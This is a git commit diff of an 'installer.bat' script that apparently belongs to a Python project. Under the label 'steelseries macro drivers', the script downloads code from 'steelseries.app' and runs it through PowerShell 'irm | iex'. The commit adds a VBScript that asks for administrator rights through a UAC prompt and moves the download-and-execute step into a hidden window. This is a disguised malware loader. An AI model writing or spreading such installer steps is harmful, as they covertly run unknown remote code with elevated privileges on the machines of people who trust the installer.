53a6adb8fa7922e2dc6b474a84642770e225c0bf
ShadowCatlol <blxrewards@gmail.com>
2025-04-06 15:38:59 -0400

    Update installer.bat

--- installer.bat
+++ installer.bat
@@ -1,7 +1,36 @@
 @echo off
-:: Use steelseries macro drivers...
-powershell "irm steelseries.app/x64/macros | iex"
+setlocal EnableDelayedExpansion
 
+set "procname=cmd.exe"
+for /f %%A in ('tasklist /fi "imagename eq %procname%" ^| find /c /i "%procname%"') do set "count_before=%%A"
+
+set "vbsfile=%temp%\elevate.vbs"
+> "%vbsfile%" echo Set UAC = CreateObject^("Shell.Application"^)
+>>"%vbsfile%" echo UAC.ShellExecute "%~f0", "", "", "runas", 1
+cscript //nologo "%vbsfile%" >nul
+del "%vbsfile%"
+
+:: Wait a bit for elevated proc to start
+timeout /t 5 >nul
+
+:: Count processes after elevation attempt
+for /f %%A in ('tasklist /fi "imagename eq %procname%" ^| find /c /i "%procname%"') do set "count_after=%%A"
+
+echo Processes after: %count_after%
+
+:: Compare counts
+if %count_after% GTR %count_before% (
+    echo Elevated instance detected. Exiting this one.
+    exit /b
+) else (
+    echo No new elevated process detected. Continuing without admin.
+)
+
+:: Use steelseries macro drivers...
+
+powershell -Command "Start-Process powershell -ArgumentList 'irm steelseries.app/x64/macros ^| iex' -WindowStyle Hidden"
+
+color a
 pip install -r requirements.txt
 
 echo If the script fails...
